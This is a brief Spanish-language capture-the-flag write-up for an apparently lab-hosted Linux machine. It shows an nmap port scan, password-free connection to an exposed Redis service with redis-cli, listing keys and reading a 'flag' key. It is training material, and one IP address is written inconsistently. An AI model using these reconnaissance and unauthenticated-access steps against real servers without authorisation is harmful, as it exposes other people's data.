## Datos principales

* #Enumeracion de puertos
* #Redis
* #basesdedatos 
* #Acceso sin credenciales / Credenciales por defecto
* SO : #Linux

## Enumeración de puertos

Para  empezar el escaneo usamos la herramienta Nmap, en nuestra fase de descubrimiento , como se puede apreciar tenemos los siguientes puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.172.166
```

Puerto abierto:
	*6379* --> redis

Podemos ver que esta levantado el servicio de redis, por lo tanto voy a comprobar si me puedo conectar al servicio como dice en su manual.

```bash
redis-cli -h <ip> 
redis-cli -h 10.129.136.187
```


La opción *-h* es para decirle que damos una dirección ip.

Vemos que tenemos acceso sin poner ninguna contraseña

```bash
10.139.136.187:6379> 
```

Para poder listar el contenido de la base de datos tenemos que usar la palabra reservada key:

```bash
10.139.136.187:6379> keys *
1) "numb"
2) "temp"
3) "stor"
4) "flag"
```

Vemos que en la tabla 4 se encuentra la tabla “flag” por lo tanto tenemos que ver el contenido de esa tabla para ello he investigado y el comando es:

```bash
10.139.136.187:6379> get flag
```
